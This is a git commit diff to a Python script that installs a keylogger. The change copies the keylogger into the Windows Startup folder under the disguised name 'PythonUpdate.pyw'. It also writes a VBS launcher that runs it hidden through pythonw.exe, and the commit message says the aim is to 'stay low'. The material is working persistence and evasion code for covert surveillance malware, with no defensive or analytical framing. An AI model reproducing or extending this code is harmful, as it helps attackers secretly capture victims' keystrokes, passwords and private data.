d66ca1fe45f058ea4939b1e5194119c959d6d111
Melih Aybar <melihaybar2606@gmail.com>
2024-06-10 14:14:07 +0300

    Using vbs instead of bat, pyw to stay low, rename files

--- main.py
+++ main.py
@@ -22,14 +22,14 @@ time.sleep(60)
 startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
 
 current_dir = os.getcwd()
-keylogger_script = os.path.join(current_dir, "ky.py")
-keylogger_script_startup = os.path.join(startup_folder, "ky.py")
-bat_script_path = os.path.join(startup_folder, "PythonUpdater.bat")
+keylogger_script = os.path.join(current_dir, "PythonUpdate.py")
+keylogger_script_startup = os.path.join(startup_folder, "PythonUpdate.pyw")
+bat_script_path = os.path.join(startup_folder, "PythonUpdate.vbs")
 
 shutil.copy(keylogger_script, keylogger_script_startup)
 
-with open(bat_script_path, 'w') as bat_file:
-    bat_file.write(f'@echo off\n')
-    bat_file.write(f'python "{keylogger_script_startup}"\n')
+with open(bat_script_path, 'w') as vbs_file:
+    vbs_file.write(f'Set WshShell = CreateObject("WScript.Shell")\n')
+    vbs_file.write(f'WshShell.Run "pythonw.exe {keylogger_script_startup}", 0\n')
 
-subprocess.run([sys.executable, keylogger_script])
+subprocess.run(["pythonw.exe", keylogger_script])
